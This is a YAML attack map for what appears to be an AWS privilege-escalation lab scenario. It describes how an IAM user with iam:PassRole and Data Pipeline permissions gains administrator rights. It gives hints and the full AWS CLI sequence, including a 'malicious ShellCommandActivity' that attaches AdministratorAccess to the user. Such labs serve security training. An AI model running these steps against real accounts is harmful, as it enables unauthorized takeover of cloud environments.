attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-datapipeline-001-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could have been
        obtained through many real-world vectors: phishing a developer and gaining access to
        their workstation, compromising a browser session, exploiting a vulnerable workload
        running in this AWS account, discovering credentials in a public S3 bucket, or finding
        them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on an administrative role plus datapipeline:CreatePipeline,
        datapipeline:PutPipelineDefinition, and datapipeline:ActivatePipeline permissions.

    - id: pipeline-role
      label: "Admin Pipeline Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-datapipeline-001-to-admin-pipeline-role"
      description: >
        This IAM role has administrative permissions and can be passed to AWS Data Pipeline
        EC2 resources via iam:PassRole. When an EC2 instance is launched by the pipeline
        with this role attached, commands executed on that instance run with the role's
        elevated permissions, completing the privilege escalation.

  edges:
    - from: starting-user
      to: pipeline-role
      label: "datapipeline:CreatePipeline + PutPipelineDefinition + iam:PassRole"
      description: >
        Create a Data Pipeline and define it with a ShellCommandActivity, passing the admin
        role to the pipeline's EC2 resource via iam:PassRole.
      hints:
        - "Use iam:ListRoles to discover which roles exist and which ones have administrative policies attached."
        - "Your iam:PassRole permission is scoped to a specific role -- check which services that role's trust policy allows as a principal."
        - "AWS Data Pipeline can launch EC2 instances; the ec2Resource object in a pipeline definition accepts a 'role' and 'resourceRole' field -- these are how you pass an IAM role to the instance."
        - "A ShellCommandActivity in a pipeline definition runs shell commands on the EC2 resource with the credentials of the attached role -- what IAM command would give you elevated access?"
        - "The sequence is: CreatePipeline, then PutPipelineDefinition (with your malicious ShellCommandActivity referencing the admin role), then ActivatePipeline -- the EC2 instance won't spin up until you activate."
        - "After activating, use datapipeline:DescribePipelines or datapipeline:GetPipelineDefinition to monitor status; the IAM change will appear in CloudTrail from the EC2 instance, not from your user."
        - "Browse to https://pathfinding.cloud/paths/datapipeline-001 for full technique details."
      commands:
        - description: "Create a new Data Pipeline"
          command: "aws datapipeline create-pipeline --name pl-privesc-pipeline --unique-id pl-privesc-$(date +%s)"
        - description: "Define the pipeline with a malicious ShellCommandActivity"
          command: "aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> --pipeline-objects file://pipeline-definition.json"
        - description: "Activate the pipeline to trigger execution"
          command: "aws datapipeline activate-pipeline --pipeline-id <pipeline-id>"
        - description: "Command run by the EC2 instance via ShellCommandActivity"
          command: "aws iam attach-user-policy --user-name pl-prod-datapipeline-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        - description: "Verify administrator access after pipeline completes"
          command: "aws iam list-attached-user-policies --user-name pl-prod-datapipeline-001-to-admin-starting-user"
